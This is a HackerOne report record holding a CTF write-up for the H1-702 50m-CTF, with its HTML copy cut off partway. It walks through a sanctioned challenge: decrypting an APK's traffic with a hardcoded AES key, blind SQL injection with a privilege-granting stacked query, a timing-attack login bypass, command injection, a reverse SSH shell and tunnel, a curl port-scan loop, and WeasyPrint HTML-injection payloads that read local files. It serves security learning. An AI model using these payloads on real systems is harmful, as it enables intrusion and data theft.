{"id":508123,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDgxMjM=","url":"https://hackerone.com/reports/508123","title":"@ajxchapman 50m-ctf writeup","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-11T23:40:07.905Z","submitted_at":"2019-03-11T23:40:07.905Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ajxchapman","url":"/ajxchapman","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:55:48.815Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:55:42.787Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# 50m-ctf writeup\n## TL;DR\nFlag is `c8889970d9fb722066f31e804e351993`, thanks for the challenge!\n\n## Introduction\nMy goal for this CTF was to primarily use tools and scripts that I had personally written to complete it. Throughout this challenge I used and extended my personal toolkit extensively. All the proof of concept tools I have produced as a result of this CTF are available in a [GitHub Gist](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97) (to be made public after the CTF has concluded and reports published).\n\n## Stage 1 - CTF Announcement Image\nThe H1-702 50m-CTF was announced on Twitter with two images [https://twitter.com/Hacker0x01/status/1100543680383832065](https://twitter.com/Hacker0x01/status/1100543680383832065), an no other details! The implication being that all the details required were included in the tweet.\n\nOf the two images, the first image included the names of many of the top hackers on HackerOne. The second image included a flag (a not so subtle hint maybe?) with a repeating binary code in the background. Decoding this binary code seemed to be the objective of this first clue.\n\nBeing the odd kind of lazy, in that I would prefer to spend hours writing code instead of doing something manually for 20 minutes, I set out to write a script to extract the binary code from the image using character recognition. Initial tests with OCR libraries (tesseract, ocr.space, etc.) did not provide very useful results due to the noise in the image. So I sat down to write a script using the Python Pillow library to do this manually.\n\nThe script ([available here](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-image_extract-py)) went through each line in the image, annotated the identified characters and attempted to determine if a given character was a `1` or a `0` based on the character width (a non-fixed width font was used in the image which helped).\n\nA copy of the annotated image can be seen below:\n{F439682}\n\nThe output was somewhat tricky, as the character extraction was not 100% reliable due to image composition and noise, and no single line included the full output. With a little fiddling, however, the full binary code was easily extracted, and the message decoded:\n* Binary String\n  * `011110100110110001101001011000100010101101111000100111000100101111001010001011001101000101001011110010011101011111001111001100000010110011001001010010000010110111001010000001010000000000100101110100100000010100101001`\n* Decoded into bytes\n  * `'zlib+xK,K0,H-\\x05\\x00%\\x05)'`\n* Zlib decompressed\n  * [bit.do/h1therm](http://bit.do/h1therm)\n* Un-shortened URL\n  * [https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view)\n\nThis provided an Android APK file for download and allowed me to start on the next stage.\n\n#### Tools\n* [image_extract.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-image_extract-py)\n\n### Summary of Issues:\n* Storing sensitive information in plain sight ;-)\n\n## Stage 2 - Android APK\nWithout a spare test Android device to hand I downloaded and ran [Android x86](http://www.android-x86.org/) in a VirtualBox Virtual Machine. Running the `h1thermostat` application downloaded from the previous stage I was greeted with a login screen:\n\n{F439681}\n\nAnalysis of the network traffic from the VM using [Wireshark](https://www.wireshark.org/) showed the `h1thermostat` application sends unencrypted HTTP requests to a server at `35.243.186.41`:\n\n```http\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nUser-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; VirtualBox Build/OPM8.190105.002)\nHost: 35.243.186.41\nConnection: Keep-Alive\nAccept-Encoding: gzip\nContent-Length: 123\n\nd=aKe2ZHj8oYjIqvbWwXi01599IT979iLWxWp6e7LhCqYZUBGSSLBZz6kkEzuElZViz270iXUjPuGg%0At%2F803RyZmSHaMd0KzZPTD%2FdgQlUgoNA%3D%0A\u0026\n```\nWhilst the application did not use TLS to encrypt the entire HTTP session, it appeared that the POST payload was in an encrypted form. In order to decrypt the payload I would have to review the application code.\n\nBreaking out [apktool](https://github.com/iBotPeaches/Apktool), [dex2jar](https://github.com/pxb1988/dex2jar) and [JD-Gui](https://github.com/java-decompiler/jd-gui) to extract the apk, disassemble the Dalvik executable to Java bytecode and decompile the Java bytecode to readable Java, I was able to get a good view of the application source code.\n\nA review of the decompiled source code identified the encryption / decryption functions in `com.hackerone.thermostat.PayloadRequest`:\n```java\nprivate String buildPayload(JSONObject paramJSONObject)\n    throws Exception\n  {\n    SecretKeySpec localSecretKeySpec = new SecretKeySpec(new byte[] { 56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116 }, \"AES\");\n    byte[] arrayOfByte = new byte[16];\n    new SecureRandom().nextBytes(arrayOfByte);\n    Object localObject = new IvParameterSpec(arrayOfByte);\n    Cipher localCipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n    localCipher.init(1, localSecretKeySpec, (AlgorithmParameterSpec)localObject);\n    localObject = localCipher.doFinal(paramJSONObject.toString().getBytes());\n    paramJSONObject = new byte[localObject.length + 16];\n    System.arraycopy(arrayOfByte, 0, paramJSONObject, 0, 16);\n    System.arraycopy(localObject, 0, paramJSONObject, 16, localObject.length);\n    return Base64.encodeToString(paramJSONObject, 0);\n  }\n```\n\nThis code snippet shows that the application used AES with Cipher Block Chaining and PKCS5 padding. A static encryption key is used, and a random IV generated which is prepended to the encrypted message before the entire thing is base64 encoded.\n\nDecrypting this with Python gives us:\n```Python\nimport base64\nfrom Crypto.Cipher import AES\n\nkey = [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]\ndef decrypt(data):\n    def _unpad(s):\n        return s[:-ord(s[len(s)-1:])]\n    data = base64.b64decode(data)\n    iv = data[:16]\n    data = data[16:]\n    cipher = AES.new(bytes(key), AES.MODE_CBC, iv)\n    return _unpad(cipher.decrypt(data)).decode()\n\nprint(decrypt(\"aKe2ZHj8oYjIqvbWwXi01599IT979iLWxWp6e7LhCqYZUBGSSLBZz6kkEzuElZViz270iXUjPuGgt/803RyZmSHaMd0KzZPTD/dgQlUgoNA=\"))\n```\n```json\n{\"username\":\"username\",\"password\":\"password\",\"cmd\":\"getTemp\"}\n```\n\nArmed with the ability to encrypt and decrypt payloads I could progress to the next stage!\n\n### Summary of Issues:\n* Hardcoded cryptographic key\n* No TLS and certificate pinning\n\n## Stage 3 - FliteThermostat API\nVisiting the http://35.243.186.41/ site directly gives the error message \"The method is not allowed for the requested URL\" showing that I was dealing with a Python Flask application.\n\nThe first thing I tried was guessing credentials, so I scripted up my encryption / decryption code with Python Requests and started sending username and password combination to the server. Very quickly I come across a valid combination `admin:password`.\n\nPlugging these credentials back into the Android application shows some more, but very limited functionality. I now had the ability to send the `setTemp` command (although it should be noted that this doesn't seem to actually change anything significantly). In order to attempt to increase the application attack surface I set out bruteforcing alternative commands. After a reasonably extensive round of command guessing I came up with only the following commands:\n* getTemp - Gleaned from initial network traffic analysis\n* setTemp - Observed from logging in the the `admin:password` credentials\n* diag - Guessed command, always responding with \"Missing diagnostic parameters\" no matter the parameters I supplied\n\nNoting that there did not appear to be a large attack surface I reviewed what I already knew, and set about looking for other weaknesses. It was at this point I observed that the `username` parameter appeared to be vulnerable to blind SQL injection. The following request payload would happily supply the `getTemp` response as if the actual credentials were supplied, confirming the blind SQL injection vulnerability:\n```json\n{\"username\":\"admi' + (SELECT 'n') +'\", \"password\":\"password\", \"cmd\":\"getTemp\"}\n```\n\nUsing Blind SQLi techniques outlined in one of my old blog posts ([Blind SQL injection optimization](https://ajxchapman.github.io/security/2017/01/14/blind-sql-injection.html)) I scripted up a tool ([decrypt_sqli.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py)) to efficiently extract the following information from the database:\n* User: root@localhost\n* Version: 10.1.37_mariadb_0_deb9u1\n* Hostname: de8c6c400a9f\n* Database: flitebackend\n* Tables: Columns\n  * Devices: ID, IP\n  * Users: ID, username, password\n\nIn addition to being able to extract data from the database, I noted that stacked queries were permitted, so I could run my own `INSERT` and `UPDATE` queries on the database. Whilst I did not find this particularly useful, I noticed that this could be abused to re-enable local file access through the `LOAD_FILE` function. `LOAD_FILE` was initially restricted as the database user had the `File_priv` revoked:\n* Load File:\n  * sql_mode: NO_AUTO_CREATE_USER_NO_ENGINE_SUBSTITUTION\n  * local_infile: ON\n  * secure_file_priv: ''\n  * File_priv: N\n\nHowever, as the database user is the root user, and stacked queries were permitted I could re-enable `LOAD_FILE` using the following query:\n```sql\nGRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#\n```\n\nWith `LOAD_FILE` re-enabled I was able to extract the source code for the FliteThermostat API application from `/app/main.py`, see attachment {main_1.py}! Although this was quite a fun attack vector, it actually didn't lead to any further stages of the CTF.\n\nGoing back to the database, dumping the contents of the `Devices` table shows numerous IP addresses, most from reserved IPv4 ranges. Ignoring the reserved addresses the table included a single publicly routable address which was extracted with the following query using the [decrypt_sqli.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py) tool:\n```shell\npython3 decrypt_sqli.py --characters \"._1234567890\" \"SELECT CONCAT(ID, '_', IP) from devices WHERE IP not LIKE '2__.%' and IP not LIKE '10.%' and IP not LIKE '192.88.%' ORDER BY ID DESC\"\n```\n```sql\n\u003e SELECT CONCAT(ID, '_', IP) from devices WHERE IP not LIKE '2__.%' and IP not LIKE '10.%' and IP not LIKE '192.88.%' ORDER BY ID DESC\n\n+---------------------+\n| CONCAT(ID, '_', IP) |\n+---------------------+\n| 69_104.196.12.98    |\n+---------------------+\n```\n\nThe extracted address led me to the next stage of the CTF.\n\n#### Tools\n* [decrypt_sqli.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py)\n\n#### Attachments\n* F439687\n\n### Summary of Issues\n* Guessable Credentials\n* Blind SQL Injection\n* Insecure database configuration leading to Local File Disclosure\n\n## Stage 4 - FliteThermostat Backend\n### Stage 4.1 Login\nVisiting the http://104.196.12.98/ application directly showed a login page. Checking a non existing page presented an error message disclosing that once again I was looking at a Python Flask application.\n\nAttempting to log into the application showed that the provided user credentials were hashed in the browser via JavaScript before being sent to the server:\n```http\nPOST / HTTP/1.1\nHost: 104.196.12.98\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://104.196.12.98/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nhash=f6e6530a2b9bad0780df53a03a161f771fecb83a66c184b356330b38bef67dd6\n```\n\nExtracting the JavaScript hashing code in order to pre-compute hashes for various username / password combinations and submitting those hashes did not lead to any results. Guessing application paths only identified pages that redirected to the login page (`/control`, `/diagnostics`, `/main`, `/update`). Unless the credentials were something obscure, I decided there must be another way to bypass the authentication mechanism.\n\nPlaying with the `hash` parameter, I observed that requests with a `hash` length of 64 characters took \u003e 500ms to respond, where as a `hash` length of anything else returned nearly immediately. It looked like the application may been vulnerable to a timing side-channel attack. Sending 256 requests with each possible value for the first byte soon confirmed it, a `hash` of length 64 which started with `f9` took \u003e 1000ms to respond where as all other values took ~500ms to respond.\n\nTiming side-channel attacks are notoriously difficult to exploit, especially so across the internet. In this case I appeared to be luck, the timing difference was easily measurable, approximately 500ms for each successful byte guessed. Even so, there were a number of techniques I used that made getting results more reliable. First, I ran my tests from a server as physically close to the target server as possible. The target was running on Google cloud in one of Google's us-east data centers, so I chose to spin up a VPS in a us-east data center to work from. Secondly, I used HTTP pipelining (a technique inspired by Albinowax's recent [talk on Turbo Intruder](https://www.youtube.com/watch?v=vCpIAsxESFY)) to help minimise TCP connection, send and response delays which would otherwise seriously skew the results. The HTTP pipelining technique I used, sent multiple requests in a single pipeline, and only measured the execution time after a first response was received. Using these techniques in a script, I was able to start getting reliable results.\n\nThe last problem to overcome was the amount of time it was going to take to guess all 32 bytes of a valid hash. Each successfully guessed byte was adding 500ms to the response time, meaning that guessing all 256 possible characters for the 14th byte would take 30 minutes, and over an hour for the 30th byte. One final shortcut was to stop guessing a byte after a result was received which was within an expected time frame for the next byte. This early exit strategy would theoretically reduce the amount of time required by half, but could possibly introduce inconsistency.\n\nAfter getting my script as reliable as possible, and leaving it for an overnight run, I had successfully extracted a valid hash value, `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`, and with this could log into the application.\n\n#### Tools\n* [timing_attack.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-timing_attack-py)\n\n### Stage 4.2 Exploitation\n\nLogging into the application once again gave limited functionality. The most interesting being the `/update` page which appeared to attempt to update the application from the `http://update.flitethermostat:5000/` endpoint, however the update consistently failed with an error \"Could not connect\".\n\nAttempting to bruteforce parameters on each of the application pages using the Burpsuite parameter names wordlist ([burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)) easily identified the `port` parameter on the `/update` page.\n\nChanging the `port` parameter affected the port the update function attempted to use, e.g. a `port` parameter of `888` caused the update check to be performed against the `http://update.flitethermostat:888/` endpoint. This showed I could have some control over the update endpoint, however the port parameter was limited to integer values only, any non integer value caused a 500 error to occur.\n\nHaving found one hidden parameter which could modify the update function, I went looking for one which could let me update the host portion of the update check. Using a larger dictionary of parameters produced no new results, so I concluded if a parameter existed it must be a compound parameter made up of multiple words joined together. I wrote another script to help generate compound wordlists, [wordlist_generator.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-wordlist_generator-py). This script could be used to scrape target URLs to generate an application specific wordlist, and join words from multiple wordlists in various ways and forms (joined with underscores, camelCase, present participle form, etc.). This produced a huge wordlist for me to unleash against the application.\n\nThe next problem was how to submit this vast wordlist to the application in a reasonable amount of time. A single threaded, synchronous, python script was far too slow, and whilst tools do exist (Wfuzz for example), I wanted to stick to my initial goal of using my own tooling. Borrowing some code from [https://www.artificialworlds.net/blog/2017/06/12/making-100-million-requests-with-python-aiohttp/](https://www.artificialworlds.net/blog/2017/06/12/making-100-million-requests-with-python-aiohttp/) and using the Python aiohttp library I wrote a very fast asynchronous request library to use [httplib.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-httplib-py). This allowed me to easily submit more than 500 requests a second, the only problem now was not DoSing the server!\n\nAfter a while the combined scripts identified the `update_host` parameter, which modified the host portion of the update function. With this and the `port` parameter I had complete control over the update destination. Pointing the `update_host` at a VPS I controlled, I expected to receive an HTTP request from the server, however no request was received. I tried IP addresses, encoded IP addresses, the localhost address, nothing seem to modify the result of the update function, the \"Could not connect\" error was always returned.\n\nEventually I considered that the vulnerability may not be in the update request, but the parameter itself. Soon after this thought, I identified that the parameter was vulnerable to simple command injection using the `$(\u003ccommand\u003e)` sequence.\n\n```HTTP\nGET /update?update_host=$(echo+Hello+World)198.211.125.160\u0026port=80 HTTP/1.1\nHost: 104.196.12.98\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://104.196.12.98/main\nConnection: close\nCookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIJAHQ.604xiUcoHwNGwnR5oPQ7kq2Rmak\nUpgrade-Insecure-Requests: 1\n```\n\nThis allowed me to move onto the next stage and attempt to further compromise the server.\n\n#### Tools\n* [wordlist_generator.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-wordlist_generator-py)\n* [httplib.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-httplib-py)\n\n### Summary of Issues:\n* Non-constant time credential comparison leading to authentication bypass\n* Unlisted query parameters accessible\n* Command injection\n\n## Stage 5 - System Compromise\nThe first thing I do when getting command injection is to identify the user the command is running as, in this case on a Linux server via the `id` command:\n```shell\nuid=0(root) gid=0(root) groups=0(root)\n```\nWell that was easy, no need to go looking for privilege escalation issues in this instance.\n\nIn order to assist in the assessment of the server I used my [SSHReverseShell](https://github.com/ajxchapman/sshreverseshell) tool, creating new SSH keys on the server using the `ssh-keygen` command, and connecting a reverse ssh shell back to a VPS I controlled. This gave me secure full TTY shell on the compromised server with which to explore further. After finding few files of interest (barring the source code to the previous level of course F439685), I went looking at the network.\n\n```sh\nip address\n1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n188: eth0@if189: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default\n    link/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.27.0.3/16 brd 172.27.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n```\nThis showed that the compromised host was on the `172.27.0.3/16` private network. Using `curl` as a rudimentary portscanner I quickly found that I could only obviously route network traffic to 3 hosts in this network range. Further more I identified HTTP servers on all 3 of the routable hosts.\n\n```sh\nfor i in {1..255}; do for j in 22 80 443; do ERROR=$(curl -sS 172.27.0.$i:$j 2\u003e\u00261 1\u003e/dev/null); echo -e \"172.27.0.$i:$j\\t${ERROR:-Open}\"; done; done\n\n172.27.0.1:22   curl: (56) Recv failure: Connection reset by peer\n172.27.0.1:80   Open\n172.27.0.1:443  curl: (7) Failed to connect to 172.27.0.1 port 443: Connection refused\n172.27.0.2:22   curl: (7) Failed to connect to 172.27.0.2 port 22: Connection refused\n172.27.0.2:80   Open\n172.27.0.2:443  curl: (7) Failed to connect to 172.27.0.2 port 443: Connection refused\n172.27.0.3:22   curl: (7) Failed to connect to 172.27.0.3 port 22: Connection refused\n172.27.0.3:80   Open\n172.27.0.3:443  curl: (7) Failed to connect to 172.27.0.3 port 443: Connection refused\n172.27.0.4:22   curl: (7) Failed to connect to 172.27.0.4 port 22: No route to host\n172.27.0.4:80   curl: (7) Failed to connect to 172.27.0.4 port 80: No route to host\n172.27.0.4:443  curl: (7) Failed to connect to 172.27.0.4 port 443: No route to host\n172.27.0.5:22   curl: (7) Failed to connect to 172.27.0.5 port 22: No route to host\n172.27.0.5:80   curl: (7) Failed to connect to 172.27.0.5 port 80: No route to host\n172.27.0.5:443  curl: (7) Failed to connect to 172.27.0.5 port 443: No route to host\n172.27.0.6:22   curl: (7) Failed to connect to 172.27.0.6 port 22: No route to host\n...\n```\n\n{F439680}\n\nA quick check with `curl` showed that the webservers on two of the IP addresses were pointing at the previous FliteThermostat Backend application, whilst the 3rd was hosting a new application, and the next stage of the CTF.\n\nUsing SSH to reverse tunnel traffic through the compromised host to the new web server I could access the new application from my browser:\n```sh\nssh -N -R 8001:172.27.0.2:80 -o \"StrictHostKeyChecking no\" -o \"UserKnownHostsFile /dev/null\" \u003cuser\u003e@\u003cserver\u003e\n```\n{F439676}\n\n\n#### Attachments\n* F439685\n\n#### Tools\n* [SSHReverseShell](https://github.com/ajxchapman/sshreverseshell)\n\n### Summary of Issues\n* Web application running as root user\n* Insufficient network segregation\n\n## Stage 6 - HackerOne Accounting Application\nTunnelling through to the compromised host at http://172.27.0.2:80 provided access to YAPFA (Yet Another Python Flask Application).\n\nAccessing each of the available links of the application presented a login page. Reviewing the login page it appeared that the `password` parameter was vulnerable to some form of injection. Adding the tick character `'` the application responded with a HTTP 500 error, adding two in a row `''` the application returned a 200 status. However, there were oddities in this behaviour, for example a password value of `pas'sw'ord` also returned a 200 status, where a 500 error would be expected on a real injection vulnerability. This indicated there was something odd going on with this parameter, but it definitely was not a straight forward SQL or NoSQL injection.\n\nFurther analysis of the application HTML identified a commented out link on the `/invoices` page:\n```html\n\u003c!--\u003cli  class=\"nav-item\" \u003e\n\t\u003ca class=\"nav-link\" href=\"/invoices/new\"\u003eNew Invoice\u003c/a\u003e\n\u003c/li\u003e--\u003e\n```\n\nAccessing this page presented application functionality instead of the expected login form. This application page allowed the preparation of invoices, previewing them in HTML format or downloading them as PDFs.\n\n```http\nGET /invoices/preview?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://127.0.0.1:8001/invoices/new\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nThe obvious first step was to go looking for HTML injection issues with a goal of being able to have the PDF renderer parse arbitrary HTML. Luckily I found one quite easily in sub-parameters of the `styles` JSON parameter. These parameters allowed the injection of all of the characters needed for HTML injection, `\u003c\u003e'= /`, e.g. `\"styles\":{\"htmlinjection\":{\"\u003cb\u003eTest Injection\":\"\"}`, which would result in `\u003cb\u003eTest Injection` being returned within a `\u003cstyle\u003e` tag in the PDF preview.\n\nThis had one caveat, closing tags appeared to be stripped. In order to render injected HTML I needed to break out of the `\u003cstyle\u003e` tag the content was rendered in, but simply adding a closing tag `\u003c/style\u003e` did not work. A common issue with input sanitization is not recursively sanitizing the input. In this case, any tag which matched the regular expression `\u003c/[A-Za-z]+\u003e` appeared to be stripped, however, this could be bypassed by embedding one closing tag within another, e.g. `\u003c/\u003c/x\u003estyle\u003e` when sanitized would result in `\u003c/style\u003e`, which is what was needed.\n\nWith the ability to inject arbitrary HTML into the PDF renderer, the next step was to try and exploit the PDF renderer itself. Common HTML rendering vulnerabilities include local file disclosure, and this was the issue I went looking for. I quickly identified that images on the local filesystem could be included in generated PDFs with a payload of `\u003c/\u003c/x\u003estyle\u003e\u003cimg+src='file:///usr/lib/python3.5/idlelib/Icons/idle_16.png'+/\u003e`, however methods commonly used for LFD were not working (`\u003ciframe\u003e`, `\u003cembed\u003e`, `\u003cobject\u003e`, etc.) and injected JavaScript was not being executed. I also noticed that the PDFs had an embedded `/Creator` and `/Producer` tag of `cairo 1.14.8 (http://cairographics.org)`.\n\nGoogling for common PDF rendering engines gave numerous results (xhtml2pdf, pdfcrowd, pdfkit, etc.), however only one seemed to fit the constraints identified above, WeasyPrint. This was confirmed by attempting to render an image from a remote server under my control with the payload `\u003c/\u003c/x\u003estyle\u003e\u003cimg+src='http://images.example.com'+/\u003e`:\n```access.log\nINFO - \"104.196.12.98\" - http://images.example.com:80 [11/Mar/2019:12:03:36 +0000] \"GET / HTTP/1.1\" 200 161 \"-\" \"WeasyPrint 44 (http://weasyprint.org/)\"\n```\n\n[WeasyPrint](https://github.com/Kozea/WeasyPrint) is an open source Python HTML to PDF library, so I went looking through the source code on GitHub. First thing that I noticed was this little gem from their documentation\n\n\u003e When used with untrusted HTML or untrusted CSS, WeasyPrint can meet security problems. You will need extra configuration in your Python application to avoid high memory use, endless renderings or local files leaks.\n\nhttps://github.com/Kozea/WeasyPrint/blob/master/docs/tutorial.rst\n\nAuditing the WeasyPrint source I quickly found the following interesting code comment:\n```python\n#: File attachments, as a list of tuples of URL and a description or\n#: :obj:`None`. (Defaults to the empty list.)\n#: Extracted from the ``\u003clink rel=attachment\u003e`` elements in HTML\n#: and written to the ``/EmbeddedFiles`` dictionary in PDF.\n#:\n#: .. versionadded:: 0.22\nself.attachments = attachments or []\n```\n`/weasyprint/document.py:319`\n\nThis strongly suggested that if I injected a `\u003clink rel=\"attachment\" href=\"URL\"\u003e` tag, the URL pointed to by the `href` attributed would be embedded in the generated PDF document in an `/EmbeddedFile` stream. Further review of the source code confirmed this.\n```python\nelif element.tag == 'link' and element_has_link_type(\n        element, 'attachment'):\n    url = get_url_attribute(element, 'href', base_url)\n    title = element.get('title', None)\n    if url is None:\n        LOGGER.error('Missing href in \u003clink rel=\"attachment\"\u003e')\n    else:\n        attachments.append((url, title))\n```\n`/weasyprint/html.py:307`\n\n```python\ndef _write_pdf_embedded_files(pdf, attachments, url_fetcher):\n    \"\"\"Write attachments as embedded files (document attachments).\n    :return:\n        the object number of the name dictionary or :obj:`None`\n    \"\"\"\n    file_spec_ids = []\n    for attachment in attachments:\n        file_spec_id = _write_pdf_attachment(pdf, attachment, url_fetcher)\n```\n`/weasyprint/pdf.py:416`\n\nFinally, trying it out for real with the payload `\u003c/\u003c/x\u003estyle\u003e\u003clink+rel='attachment'+href='file:///app/main.py'\u003e` confirmed the contents of the file was included in an `/EmbeddedFile` stream, and could be extracted through the FireFox PDF renderer to view the contents.\n\n{F439677}\n\nGaining access to the `/app/main.py` file in this stage was the final flag in this CTF!\n\n#### Attachments:\n* F439686\n* F439678\n\n### Summary of Issues:\n* HTML injection via insufficient input validation and sanitization\n* PDF rendering Local File Disclosure\n\n# Closing thoughts\nWhilst the narrative presented here is the most direct route I *could* have taken to complete this CTF, it does gloss over the many hours of failure, rabbit holes dived into and red herrings chased. It specifically does not mention the many millions of requests made in vain whist attempting to guess query string parameters. It 100% ignores the day spent attempting to perform a timing attack to guess single characters at a time (instead of bytes). And it fails to reveal the full time spent scripting up character recognition when a pen and paper would have done the job just as well in less than 1/10 of the time.\n\nI learned a huge amount participating, and failing hard, in this CTF and fortified my toolkit with many new and revised tools ([available here for you to try too](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97)). Thanks to @Hacker0x01 and @daeken for putting this challenge together!\n\n## Impact\n\nFlag is `c8889970d9fb722066f31e804e351993`, thanks for the challenge!","vulnerability_information_html":"\u003ch1 id=\"50m-ctf-writeup\"\u003e50m-ctf writeup\u003c/h1\u003e\n\n\u003ch2 id=\"tl-dr\"\u003eTL;DR\u003c/h2\u003e\n\n\u003cp\u003eFlag is \u003ccode\u003ec8889970d9fb722066f31e804e351993\u003c/code\u003e, thanks for the challenge!\u003c/p\u003e\n\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eMy goal for this CTF was to primarily use tools and scripts that I had personally written to complete it. Throughout this challenge I used and extended my personal toolkit extensively. All the proof of concept tools I have produced as a result of this CTF are available in a \u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGitHub Gist\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (to be made public after the CTF has concluded and reports published).\u003c/p\u003e\n\n\u003ch2 id=\"stage-1-ctf-announcement-image\"\u003eStage 1 - CTF Announcement Image\u003c/h2\u003e\n\n\u003cp\u003eThe H1-702 50m-CTF was announced on Twitter with two images \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1100543680383832065\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/Hacker0x01/status/1100543680383832065\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, an no other details! The implication being that all the details required were included in the tweet.\u003c/p\u003e\n\n\u003cp\u003eOf the two images, the first image included the names of many of the top hackers on HackerOne. The second image included a flag (a not so subtle hint maybe?) with a repeating binary code in the background. Decoding this binary code seemed to be the objective of this first clue.\u003c/p\u003e\n\n\u003cp\u003eBeing the odd kind of lazy, in that I would prefer to spend hours writing code instead of doing something manually for 20 minutes, I set out to write a script to extract the binary code from the image using character recognition. Initial tests with OCR libraries (tesseract, ocr.space, etc.) did not provide very useful results due to the noise in the image. So I sat down to write a script using the Python Pillow library to do this 